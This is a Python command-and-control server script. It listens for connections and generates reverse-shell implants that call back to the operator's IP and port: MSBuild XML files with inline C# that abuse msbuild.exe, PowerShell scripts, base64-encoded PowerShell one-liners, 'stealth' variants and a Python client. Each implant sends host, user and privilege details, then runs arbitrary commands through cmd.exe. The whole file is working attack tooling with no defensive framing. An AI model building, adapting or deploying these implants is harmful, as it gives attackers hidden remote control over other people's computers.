from time import sleep
import netifaces as ni
import threading
import readline
import socket
import os, sys


###################COLORS#################
color_RED = '\033[91m'
color_GRE = '\033[92m'
color_YELL = '\033[93m'
color_BLU = '\033[94m'
color_PURP = '\033[35m'
color_reset = '\033[0m'
green_plus = color_GRE + "[+] " + color_reset

######ARRAYS#####
clients = []
clients_info = []

# print local interfaces and ips
print("")
ifaces = ni.interfaces()
for face in ifaces:
    try:  # check to see if the interface has an ip
        print('{} {}'.format(str(face + ':').ljust(20), ni.ifaddresses(face)[ni.AF_INET][0]['addr']))
    except BaseException as exc:
        continue

local_ip = input("\nEnter you local ip or interface: ")

# lets you enter eth0 as the ip
if local_ip in ifaces:
    local_ip = str(ni.ifaddresses(local_ip)[ni.AF_INET][0]['addr'])
    print("local IP => " + local_ip)

######SERVER_VARS######
PORT = int(input("Enter a Port Number: "))
SERVER = local_ip
ADDR = (SERVER, PORT)
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(ADDR)

def gen_msbuild_stealth():
    xml_payload = ''
    xml_payload += '<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">\n'
    xml_payload += '<!-- C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe SimpleTasks.csproj -->\n'
    xml_payload += '	<Target Name="ClientName">\n'
    xml_payload += '            <Client /> \n'
    xml_payload += '          </Target>\n'
    xml_payload += '          <UsingTask\n'
    xml_payload += '            TaskName="Client"\n'
    xml_payload += '            TaskFactory="CodeTaskFactory"\n'
    xml_payload += '            AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll" >\n'
    xml_payload += '            <Task>\n'

    xml_payload += '              <Code Type="Class" Language="cs">\n'
    xml_payload += '              <![CDATA[\n'
    xml_payload += 'using System; using System.Text; using System.Net; using System.Net.Sockets; using Microsoft.Win32; using System.Security.Principal; using System.Diagnostics; using Microsoft.Build.Framework; using Microsoft.Build.Utilities;\n'
    xml_payload += 'public class Client : Task, ITask {\n'

    xml_payload += '        public static bool IsAdministrator()\n'
    xml_payload += '        {\n'
    xml_payload += '            return (new WindowsPrincipal(WindowsIdentity.GetCurrent()))\n'
    xml_payload += '                      .IsInRole(WindowsBuiltInRole.Administrator);\n'
    xml_payload += '        }\n'

    xml_payload += '        public static void client_connect() {\n'
    xml_payload += '            byte[] bytes = new byte[8192];\n'

    xml_payload += '            try\n'
    xml_payload += '            {\n'
    xml_payload += '                IPAddress ipAddress = IPAddress.Parse("%s");\n' % local_ip
    xml_payload += '                IPEndPoint server = new IPEndPoint(ipAddress, %s);\n' %PORT

    xml_payload += '                // Create a TCP/IP  socket.\n'
    xml_payload += '                Socket sock = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);\n'

    xml_payload += '                // Connect the socket to the remote endpoint. Catch any errors.\n'
    xml_payload += '                try\n'
    xml_payload += '                {\n'
    xml_payload += '                    // Connect to Remote EndPoint\n'
    xml_payload += '                    sock.Connect(server);\n'

    xml_payload += '                    Console.WriteLine("Socket connected to {0}", sock.RemoteEndPoint.ToString());\n'

    xml_payload += '                    // Encode the data string into a byte array.\n'

    xml_payload += '                    string osInfo = "na";\n'
    xml_payload += '                    string perms = "na";\n'

    xml_payload += '                    byte[] msg = Encoding.ASCII.GetBytes(osInfo + "," + perms + "," + "na" + "," + "na" + "," + "na" + ",MSBuild-CSharp-Stealth");\n'
    xml_payload += '                    sock.Send(msg);\n'

    xml_payload += '                    while (true) {\n'
    xml_payload += '                        int command = sock.Receive(bytes);\n'
    xml_payload += '                        string cmd = Encoding.ASCII.GetString(bytes, 0, command);\n'
    xml_payload += '                        sock.Send(Encoding.ASCII.GetBytes("Command Recieved  "));\n'

    xml_payload += '                        if (cmd == "get_host_info")\n'
    xml_payload += '                        {\n'
    xml_payload += '                            sock.Send(Encoding.ASCII.GetBytes(" > "));\n'
    xml_payload += '                        }\n'
    xml_payload += '                        else if (cmd == "exit")\n'
    xml_payload += '                        {\n'
    xml_payload += '                            sock.Shutdown(SocketShutdown.Both);\n'
    xml_payload += '                            sock.Close();\n'
    xml_payload += '                            break;\n'
    xml_payload += '                        }\n'
    xml_payload += '                        else {\n'
    xml_payload += '                            Process p = new Process();\n'
    xml_payload += '                            p.StartInfo.UseShellExecute = false;\n'
    xml_payload += '                            p.StartInfo.RedirectStandardOutput = true;\n'
    xml_payload += '                            p.StartInfo.FileName = "cmd.exe";\n'
    xml_payload += '                            p.StartInfo.Arguments = (@"/C " + cmd);\n'
    xml_payload += '                            p.Start();\n'
    xml_payload += '                            string output = p.StandardOutput.ReadToEnd();\n'
    xml_payload += '                            p.WaitForExit();\n'
    xml_payload += '                            sock.Send(Encoding.ASCII.GetBytes(output.Length.ToString().PadLeft(12, \'0\'))); // go from output to the length of output change it to a string and pad it with leading zeros\n'
    xml_payload += '                            sock.Send(Encoding.ASCII.GetBytes(output));\n'

    xml_payload += '                        }\n'
    xml_payload += '                    }\n'

    xml_payload += '                }\n'
    xml_payload += '                catch (ArgumentNullException ane)\n'
    xml_payload += '                {\n'
    xml_payload += '                    Console.WriteLine("ArgumentNullException : {0}", ane.ToString());\n'
    xml_payload += '                    client_connect();\n'
    xml_payload += '                }\n'
    xml_payload += '                catch (SocketException se)\n'
    xml_payload += '                {\n'
    xml_payload += '                    Console.WriteLine("SocketException : {0}", se.ToString());\n'
    xml_payload += '                    client_connect();\n'
    xml_payload += '                }\n'
    xml_payload += '                catch (Exception e)\n'
    xml_payload += '                {\n'
    xml_payload += '                    Console.WriteLine("Unexpected exception : {0}", e.ToString());\n'
    xml_payload += '                    client_connect();\n'
    xml_payload += '                }\n'

    xml_payload += '            }\n'
    xml_payload += '            catch (Exception e)\n'
    xml_payload += '            {\n'
    xml_payload += '                Console.WriteLine(e.ToString());\n'
    xml_payload += '                client_connect();\n'
    xml_payload += '            }\n'
    xml_payload += '        }\n'

    xml_payload += '        public override bool Execute()\n'
    xml_payload += '		{\n'
    xml_payload += '            client_connect();\n'
    xml_payload += '			return true;\n'
    xml_payload += '        }}\n'
    xml_payload += '                                ]]>\n'
    xml_payload += '                        </Code>\n'
    xml_payload += '                </Task>\n'
    xml_payload += '        </UsingTask>\n'
    xml_payload += '</Project>\n'

    with open('msbuild-stealth.xml', 'w') as f:
        f.write(xml_payload)
        f.close()

    with open('RUN-msbuild-stealth.bat', 'w') as f:
        f.write(r'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe msbuild-stealth.xml')
        f.close()

def gen_msbuild():
    xml_payload = ''
    xml_payload += '<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">\n'
    xml_payload += '<!-- C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe SimpleTasks.csproj -->\n'
    xml_payload += '	<Target Name="ClientName">\n'
    xml_payload += '            <Client /> \n'
    xml_payload += '          </Target>\n'
    xml_payload += '          <UsingTask\n'
    xml_payload += '            TaskName="Client"\n'
    xml_payload += '            TaskFactory="CodeTaskFactory"\n'
    xml_payload += '            AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll" >\n'
    xml_payload += '            <Task>\n'

    xml_payload += '              <Code Type="Class" Language="cs">\n'
    xml_payload += '              <![CDATA[\n'
    xml_payload += 'using System; using System.Text; using System.Net; using System.Net.Sockets; using Microsoft.Win32; using System.Security.Principal; using System.Diagnostics; using Microsoft.Build.Framework; using Microsoft.Build.Utilities;\n'
    xml_payload += 'public class Client : Task, ITask {\n'

    xml_payload += '        public static bool IsAdministrator()\n'
    xml_payload += '        {\n'
    xml_payload += '            return (new WindowsPrincipal(WindowsIdentity.GetCurrent()))\n'
    xml_payload += '                      .IsInRole(WindowsBuiltInRole.Administrator);\n'
    xml_payload += '        }\n'

    xml_payload += '        public static void client_connect() {\n'
    xml_payload += '            byte[] bytes = new byte[8192];\n'

    xml_payload += '            try\n'
    xml_payload += '            {\n'
    xml_payload += '                IPAddress ipAddress = IPAddress.Parse("%s");\n' % local_ip
    xml_payload += '                IPEndPoint server = new IPEndPoint(ipAddress, %s);\n' % PORT

    xml_payload += '                // Create a TCP/IP  socket.\n'
    xml_payload += '                Socket sock = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);\n'

    xml_payload += '                // Connect the socket to the remote endpoint. Catch any errors.\n'
    xml_payload += '                try\n'
    xml_payload += '                {\n'
    xml_payload += '                    // Connect to Remote EndPoint\n'
    xml_payload += '                    sock.Connect(server);\n'

    xml_payload += '                    Console.WriteLine("Socket connected to {0}", sock.RemoteEndPoint.ToString());\n'

    xml_payload += '                    // Encode the data string into a byte array.\n'

    xml_payload += '                    string osInfo = Registry.GetValue(@"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "productName", "").ToString();\n'
    xml_payload += '                    string perms;\n'

    xml_payload += '                    if (IsAdministrator())\n'
    xml_payload += '                    {\n'
    xml_payload += '                        perms = "Admin";\n'
    xml_payload += '                    }\n'
    xml_payload += '                    else {\n'
    xml_payload += '                        perms = "User";\n'
    xml_payload += '                    }\n'

    xml_payload += '                    byte[] msg = Encoding.ASCII.GetBytes(osInfo + "," + perms + "," + Environment.GetEnvironmentVariable("USERDOMAIN") + "," + Environment.GetEnvironmentVariable("USERNAME") + "," + Environment.MachineName + ",MSBuild-CSharp");\n'
    xml_payload += '                    sock.Send(msg);\n'

    xml_payload += '                    while (true) {\n'
    xml_payload += '                        int command = sock.Receive(bytes);\n'
    xml_payload += '                        string cmd = Encoding.ASCII.GetString(bytes, 0, command);\n'
    xml_payload += '                        sock.Send(Encoding.ASCII.GetBytes("Command Recieved  "));\n'

    xml_payload += '                        if (cmd == "get_host_info")\n'
    xml_payload += '                        {\n'
    xml_payload += '                            sock.Send(Encoding.ASCII.GetBytes(Environment.CurrentDirectory + "> "));\n'
    xml_payload += '                        }\n'
    xml_payload += '                        else if (cmd == "exit")\n'
    xml_payload += '                        {\n'
    xml_payload += '                            sock.Shutdown(SocketShutdown.Both);\n'
    xml_payload += '                            sock.Close();\n'
    xml_payload += '                            break;\n'
    xml_payload += '                        }\n'
    xml_payload += '                        else {\n'
    xml_payload += '                            Process p = new Process();\n'
    xml_payload += '                            p.StartInfo.UseShellExecute = false;\n'
    xml_payload += '                            p.StartInfo.RedirectStandardOutput = true;\n'
    xml_payload += '                            p.StartInfo.FileName = "cmd.exe";\n'
    xml_payload += '                            p.StartInfo.Arguments = (@"/C " + cmd);\n'
    xml_payload += '                            p.Start();\n'
    xml_payload += '                            string output = p.StandardOutput.ReadToEnd();\n'
    xml_payload += '                            p.WaitForExit();\n'
    xml_payload += '                            sock.Send(Encoding.ASCII.GetBytes(output.Length.ToString().PadLeft(12, \'0\'))); // go from output to the length of output change it to a string and pad it with leading zeros\n'
    xml_payload += '                            sock.Send(Encoding.ASCII.GetBytes(output));\n'

    xml_payload += '                        }\n'
    xml_payload += '                    }\n'

    xml_payload += '                }\n'
    xml_payload += '                catch (ArgumentNullException ane)\n'
    xml_payload += '                {\n'
    xml_payload += '                    Console.WriteLine("ArgumentNullException : {0}", ane.ToString());\n'
    xml_payload += '                    client_connect();\n'
    xml_payload += '                }\n'
    xml_payload += '                catch (SocketException se)\n'
    xml_payload += '                {\n'
    xml_payload += '                    Console.WriteLine("SocketException : {0}", se.ToString());\n'
    xml_payload += '                    client_connect();\n'
    xml_payload += '                }\n'
    xml_payload += '                catch (Exception e)\n'
    xml_payload += '                {\n'
    xml_payload += '                    Console.WriteLine("Unexpected exception : {0}", e.ToString());\n'
    xml_payload += '                    client_connect();\n'
    xml_payload += '                }\n'

    xml_payload += '            }\n'
    xml_payload += '            catch (Exception e)\n'
    xml_payload += '            {\n'
    xml_payload += '                Console.WriteLine(e.ToString());\n'
    xml_payload += '                client_connect();\n'
    xml_payload += '            }\n'
    xml_payload += '        }\n'

    xml_payload += '        public override bool Execute()\n'
    xml_payload += '		{\n'
    xml_payload += '            client_connect();\n'
    xml_payload += '			return true;\n'
    xml_payload += '        }}\n'
    xml_payload += '                                ]]>\n'
    xml_payload += '                        </Code>\n'
    xml_payload += '                </Task>\n'
    xml_payload += '        </UsingTask>\n'
    xml_payload += '</Project>\n'

    with open('msbuild.xml', 'w') as f:
        f.write(xml_payload)
        f.close()

    with open('RUN-msbuild.bat', 'w') as f:
        f.write(r'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe msbuild.xml')
        f.close()

def gen_ps():

    ps_payload = ''
    ps_payload += 'Function client-conn(){\n'
    ps_payload += '	Try{\n'
    ps_payload += '		$ip = "%s"\n' % local_ip
    ps_payload += '		$port = "%s"\n' % PORT
    ps_payload += '		$socket = New-Object System.Net.Sockets.TcpClient($ip,$Port) # create socket\n'
    ps_payload += '		$tcpstream = $socket.GetStream()\n'
    ps_payload += '		$recieve = New-Object System.IO.StreamReader($tcpStream)\n'
    ps_payload += '		$send = New-Object System.IO.StreamWriter($tcpStream)\n'
    ps_payload += '		$send.AutoFlush = $true\n'

    ps_payload += '		$a = "User"\n'
    ps_payload += '		$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())\n'
    ps_payload += '		if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){\n'
    ps_payload += '			$a = "Admin"\n'
    ps_payload += '		}\n'

    ps_payload += '		$data = "Windows " + (Get-CimInstance Win32_OperatingSystem).version + "," + $a + "," + $env:UserDomain + "," + $env:UserName + "," + $env:ComputerName + ",Powershell"\n'

    ps_payload += '		$send.WriteLine($data)\n'
    ps_payload += '		while ($socket.Connected)\n'
    ps_payload += '		{\n'
    ps_payload += '			$command = ""\n'
    ps_payload += '			$command += ([char]$recieve.Read())\n'
    ps_payload += '			while(($recieve.Peek() -ne -1) -or ($socket.Available)){\n'
    ps_payload += '				$command += ([char]$recieve.Read())\n'
    ps_payload += '			}\n'
    ps_payload += '			$send.WriteLine("Command Recieved") | Out-Null\n'
    ps_payload += '			if ($command -eq "exit")\n'
    ps_payload += '			{\n'
    ps_payload += '				break\n'

    ps_payload += '			}elseif ($command -eq "get_host_info"){\n'
    ps_payload += '				$send.WriteLine("" + (Get-Location) + "> ") | Out-Null\n'

    ps_payload += '			}else{\n'
    ps_payload += '				$outp = (cmd /c $command) | Out-String\n'

    ps_payload += '				$send.WriteLine(([string]($outp.Length + 2)).PadLeft(12,\'0\')) | Out-Null\n'
    ps_payload += '				$send.WriteLine($outp) | Out-Null\n'
    ps_payload += '			}\n'
    ps_payload += '		}\n'
    ps_payload += '		$recieve.Close()\n'
    ps_payload += '		$send.Close()\n'
    ps_payload += '		$socket.Close()\n'
    ps_payload += '	}\n'
    ps_payload += '	Catch{\n'
    ps_payload += '     Start-Sleep -Seconds 5\n'
    ps_payload += '		client-conn\n'
    ps_payload += '	}\n'
    ps_payload += '}\n'
    ps_payload += 'client-conn\n'

    with open('ps.ps1', 'w') as f:
        f.write(ps_payload)
        f.close()

def gen_python():
    pypayload = ''
    pypayload += 'import socket\n'
    pypayload += 'import subprocess\n'
    pypayload += 'import os\n'
    pypayload += 'import platform\n'
    pypayload += 'from ctypes import *\n'
    pypayload += 'from time import sleep\n'

    pypayload += 'def is_admin():\n'
    pypayload += '    is_admin = False\n'
    pypayload += '    is_admin = windll.shell32.IsUserAnAdmin() != 0\n'
    pypayload += '    return is_admin\n'

    pypayload += 'def os_check():\n'
    pypayload += '    system = str(platform.system()) + " " + str(platform.release())\n'
    pypayload += '    return system\n'

    pypayload += 'def server_run_command(command):\n'
    pypayload += '    try:\n'
    pypayload += '        subp_output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n'

    pypayload += '        if len(str(subp_output.stderr)) < 5:\n'
    pypayload += '            if len(str(subp_output.stdout)) < 5:\n'
    pypayload += '                return "Command successfully executed."\n'
    pypayload += '            else:\n'
    pypayload += '                tmp = subp_output.stdout\n'
    pypayload += '                to_str = tmp.split(b"\\n")\n'
    pypayload += '                strs = ""\n'
    pypayload += '                for x in to_str:\n'
    pypayload += '                    strs += (str(x) + "\\n")\n'
    pypayload += '                strs = strs.replace("b\\\'\\\\r\\\'", "")\n'
    pypayload += '                strs = strs.replace("b\\\'", "")\n'
    pypayload += '                strs = strs.replace("\\\\r\\\'", "")\n'
    pypayload += '                strs = strs.replace("b\' \'", "")\n'
    pypayload += '                return strs\n'
    pypayload += '        else:\n'
    pypayload += '            tmp = subp_output.stderr\n'
    pypayload += '            to_str = tmp.split(b"\\n")\n'
    pypayload += '            strs = ""\n'
    pypayload += '            for x in to_str:\n'
    pypayload += '                strs += (str(x) + "\\n")\n'
    pypayload += '            strs = strs.replace("b\\\'\\\\r\\\'", "")\n'
    pypayload += '            strs = strs.replace("b\\\'", "")\n'
    pypayload += '            strs = strs.replace("\\\\r\\\'", "")\n'
    pypayload += '            strs = strs.replace("b\' \'", "")\n'
    pypayload += '            return strs\n'
    pypayload += '        return subp_output.stderr\n'
    pypayload += '    except Exception as e:\n'
    pypayload += '        return e\n'

    pypayload += 'def main():\n'
    pypayload += '    PORT = %s\n' % PORT
    pypayload += '    SERVER = "%s"\n' % local_ip
    pypayload += '    ADDR = (SERVER, PORT)\n'
    pypayload += '    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n'
    pypayload += '    try:\n'
    pypayload += '        client.connect(ADDR)\n'
    pypayload += '    except BaseException:\n'
    pypayload += '        main()\n'

    pypayload += '    if is_admin():\n'
    pypayload += '        admin = "Admin"\n'
    pypayload += '    else:\n'
    pypayload += '        admin = "User"\n'

    pypayload += '    client.send((str(os_check()) + "," + admin + "," + os.environ["userdomain"] + "," + os.environ["USERNAME"] + "," + os.environ["COMPUTERNAME"] + ",Python").encode())\n'

    pypayload += '    while True:\n'
    pypayload += '        command = ""\n'
    pypayload += '        try:\n'
    pypayload += '            command = client.recv(2048).decode()\n'
    pypayload += '            client.sendall(r"Command recieved\\r".encode())\n'

    pypayload += '            if command == "exit":\n'
    pypayload += '                break\n'
    pypayload += '            elif (command == "get_host_info"):\n'
    pypayload += '                client.sendall(str(os.getcwd() + "> ").encode())\n'
    pypayload += '            else:\n'
    pypayload += '                commrtrn = server_run_command(command)\n'
    pypayload += '                client.sendall(str(len(commrtrn)).zfill(12).encode())\n'
    pypayload += '                client.sendall(str(commrtrn).encode())\n'

    pypayload += '        except socket.error as e:\n'
    pypayload += '            print(e)\n'
    pypayload += '            sleep(5)\n'
    pypayload += '            main()\n'
    pypayload += '        except BaseException as e:\n'
    pypayload += '            print(e)\n'
    pypayload += '            continue\n'

    pypayload += 'if __name__ == "__main__":\n'
    pypayload += '    main()\n'

    with open('python.py', 'w') as f:
        f.write(pypayload)
        f.close()

def gen_ps_stealth():
    ps_payload = ''
    ps_payload += 'Function client-conn(){\n'
    ps_payload += '	Try{\n'
    ps_payload += '		$ip = "%s"\n' % local_ip
    ps_payload += '		$port = "%s"\n' % PORT
    ps_payload += '		$socket = New-Object System.Net.Sockets.TcpClient($ip,$Port) # create socket\n'
    ps_payload += '		$tcpstream = $socket.GetStream()\n'
    ps_payload += '		$recieve = New-Object System.IO.StreamReader($tcpStream)\n'
    ps_payload += '		$send = New-Object System.IO.StreamWriter($tcpStream)\n'
    ps_payload += '		$send.AutoFlush = $true\n'

    ps_payload += '		$a = "na"\n'


    ps_payload += '		$data = "na" + "," + $a + "," + "na" + "," + "na" + "," + "na" + ",Powershell-Stealth"\n'

    ps_payload += '		$send.WriteLine($data)\n'
    ps_payload += '		while ($socket.Connected)\n'
    ps_payload += '		{\n'
    ps_payload += '			$command = ""\n'
    ps_payload += '			$command += ([char]$recieve.Read())\n'
    ps_payload += '			while(($recieve.Peek() -ne -1) -or ($socket.Available)){\n'
    ps_payload += '				$command += ([char]$recieve.Read())\n'
    ps_payload += '			}\n'
    ps_payload += '			$send.WriteLine("Command Recieved") | Out-Null\n'
    ps_payload += '			if ($command -eq "exit")\n'
    ps_payload += '			{\n'
    ps_payload += '				break\n'

    ps_payload += '			}elseif ($command -eq "get_host_info"){\n'
    ps_payload += '				$send.WriteLine(" > ") | Out-Null\n'

    ps_payload += '			}else{\n'
    ps_payload += '				$outp = (cmd /c $command) | Out-String\n'

    ps_payload += '				$send.WriteLine(([string]($outp.Length + 2)).PadLeft(12,\'0\')) | Out-Null\n'
    ps_payload += '				$send.WriteLine($outp) | Out-Null\n'
    ps_payload += '			}\n'
    ps_payload += '		}\n'
    ps_payload += '		$recieve.Close()\n'
    ps_payload += '		$send.Close()\n'
    ps_payload += '		$socket.Close()\n'
    ps_payload += '	}\n'
    ps_payload += '	Catch{\n'
    ps_payload += '     Start-Sleep -Seconds 5\n'
    ps_payload += '		client-conn\n'
    ps_payload += '	}\n'
    ps_payload += '}\n'
    ps_payload += 'client-conn\n'

    with open('ps-stealth.ps1', 'w') as f:
        f.write(ps_payload)
        f.close()

def gen_ps_oneliner():
    os.system('pwsh -c \'$command = Get-Content .\ps.ps1 -raw; $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command)); Write-Output "powershell -encodedCommand $encodedCommand" | Out-File -FilePath .\ps-oneliner.bat\'')

def gen_ps_oneliner_stealth():
    os.system('pwsh -c \'$command = Get-Content .\ps-stealth.ps1 -raw; $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command)); Write-Output "powershell -encodedCommand $encodedCommand" | Out-File -FilePath .\ps-oneliner-stealth.bat\'')


def parse_args(inp):
    commands = []
    if inp.find(" ") == -1:
        commands.append(inp)
        return commands

    else:
        commands.append(inp[:inp.find(" ")])
        commands.append(inp[(inp.find(" ")+1):])
        return commands

def send(client_id, msg): # send data to a socket client
    clients[client_id].sendall(msg.encode())

def big_recieve(shell_id):
    #first the client send the size of the data so we are not guessing up to 12
    data_size = clients[shell_id].recv(14)

    #cut the data_size down to 12 chars which is all we should be getting
    data_size = data_size[:12]
    data_size = data_size.decode()
    data_size = int(data_size)

    total_data = ''
    data = '';
    #loop through the data until it is all got
    while len(total_data) < data_size:
        try:
            data = clients[shell_id].recv(data_size).decode()
            if data:
                total_data += data
            else:
                break
        except BaseException as e:
            print(e)
            print("Error in here")
            break
    msg = total_data
    return msg

def print_clients():
    print("Client_ID       IP:PORT                      OS                       Perms       Domain                 Username             Hostname             Payload-Type")

    print("---------------------------------------------------------------------------------------------------------------------------------------------------------------------")
    c = 0
    for x in clients_info:
        print(color_GRE + str(c).ljust(15), x)
        c += 1


def handle_client(conn, addr): # function to generate a new thread for each client
    print("\n" + color_BLU + f"[NEW CONNECTION] {addr} connected.\n" + color_reset)
    info = conn.recv(2048).decode() # recieve client info DH13
    dat = info.split(",")
    # 25 12 15
    info = dat[0].ljust(25)
    info += dat[1].ljust(12)
    info += dat[2].ljust(23)
    info += dat[3].ljust(21)
    info += dat[4].ljust(21)
    info += dat[5]

    clients.append(conn)
    clients_info.append(str(addr).ljust(29) + info)
    connected = True

    while connected:
        continue

    conn.close()

def start():
    server.listen()
    print(color_BLU + f"[LISTENING] Server is listening on {ADDR}" + color_reset)
    while True:
        conn, addr = server.accept()
        try:
            thread = threading.Thread(target=handle_client, args=(conn, addr))
            thread.start()
        except BaseException as e:
            print(color_RED + "[ERROR] " + str(e) + color_reset)

        print("\n" +color_BLU + f"[ACTIVE CONNECTIONS] {len(clients) + 1}" + color_reset)
        print("Enter a command: ")

#this starts the server which calls start() to create the handle client thread
def server_start():
    print("[STARTING] server is starting...")
    try:
        start_thread = threading.Thread(target=start)
        start_thread.start()
    except BaseException as e:
        print(color_RED + "[ERROR] " + str(e) + color_reset)
    sleep(1)

def main():
    server_status = False

    while True:
        command = parse_args(input(color_reset + "Enter a command: "))  # get our command while not in  the shell

        if (command[0] == "shell" and server_status == True and len(command) > 1):
            try:

                # get the shell ID and then get all needed info
                shell_id = int(command[1])
                print(color_GRE + "[*] Attempting to connect to the shell" + color_reset)
                send(shell_id, "get_host_info")
                clients[shell_id].recv(18).decode() # command recieved buffer
                client_info = clients[shell_id].recv(2048).decode()
                client_info = client_info[:client_info.find(">") + 1]

            except socket.error:
                print(color_RED + "[ERROR] The client could not be reached" + color_reset)
                print(color_YELL + "[WORKING] Removing client from list")
                del clients[shell_id]
                del clients_info[shell_id]
                print(color_GRE + "[*] Closing the shell" + color_reset)
                continue
            except KeyboardInterrupt:
                print("\n" + color_GRE + "[*] Exiting the shell" + color_reset)
                sleep(2)
                continue
            except BaseException as e:
                print(e)
                print("Howed you get here?")
                continue

            # if we made it here were in the shell
            shell = True
            print(color_GRE + "[*] Connected to the shell" + color_reset)
            while shell:
                try:
                    shell_command = input(color_reset + client_info)

                    if shell_command == "background":
                        print("\n" + color_GRE + "[*] Exiting the shell" + color_reset)
                        break

                    if shell_command == "help":
                        print("exit".ljust(25), "Exits the shell killing the client")
                        print("background".ljust(25), "Exits the shell while perserving the client")
                        continue

                    send(shell_id, shell_command) # send out command
                    clients[shell_id].recv(18).decode() # this is the command recieved buffer

                    if shell_command == "exit":
                        print(color_YELL + "[WORKING] Removing client from list")
                        del clients[shell_id]
                        del clients_info[shell_id]
                        print(color_GRE + "[*] Closing the shell" + color_reset)
                        break

                    print(big_recieve(shell_id)) # if were running a cmd command this is the output

                except socket.error:
                    print(color_RED + "[ERROR] The client could not be reached")
                    print(color_YELL + "[WORKING] Removing client from list")
                    del clients[shell_id]
                    del clients_info[shell_id]
                    print(color_GRE + "[*] Closing the shell" + color_reset)
                    break
                except KeyboardInterrupt:
                    print("\n" + color_GRE + "[*] Exiting the shell" + color_reset)
                    break
                except BaseException as e:
                    print(str(e))
                    print("Bruh :/")
                    continue

        elif (command[0] == "clients" and server_status == True):
            print_clients()
        elif (command[0] == "server_start" and server_status == True):
            print(color_YELL + "Server is already running" + color_reset)

        elif (command[0] == "server_start" and server_status == False):
            server_start()
            server_status = True;
        elif (command[0] == "cls" or command[0] == "clear"):  # does not work in ide but in regular console
            if sys.platform != "linux":
                cls = lambda: os.system('cls') # windows
                cls()
            else:
                cls = lambda: os.system('clear') # linux/mac
                cls()
        elif (command[0] == "clients" and server_status == False):
            print(color_RED + "[ERROR] Please start the server to use that command" + color_reset)
        elif (command[0] == "shell" and server_status == False):
            print(color_RED + "[ERROR] Please start the server to use that command" + color_reset)
        elif ((command[0] == "help" or command[0] == "-help") and server_status == False):
            print("Commands".ljust(25), "Description")
            print("server_start".ljust(25), "Starts the server")
            print("gen_payloads".ljust(25), "Generates payload files")
        elif ((command[0] == "help" or command[0] == "-help") and server_status == True):
            print("Commands".ljust(25), "Description")
            print("shell [Client_ID]".ljust(25), "Connects to the shell")
            print("clients".ljust(25), "Prints a list of clients")
            print("gen_payloads".ljust(25), "Generates payload files")
        elif (command[0] == 'gen_payloads'):
            print("Generating payloads")
            gen_msbuild()
            gen_msbuild_stealth()
            gen_ps()
            gen_ps_stealth()
            gen_ps_oneliner()
            gen_ps_oneliner_stealth()
            gen_python()
        elif (command[0] == 'exit' or command[0] == 'quit'):
            sys.exit(0)
        else:
            if len(command) > 1: # if they wat to run other commands within out shell
                runit = lambda: os.system(command[0] + ' ' + command[1])
                runit()
            else:
                runit = lambda: os.system(command[0])
                runit()

if __name__ == "__main__":
    main()
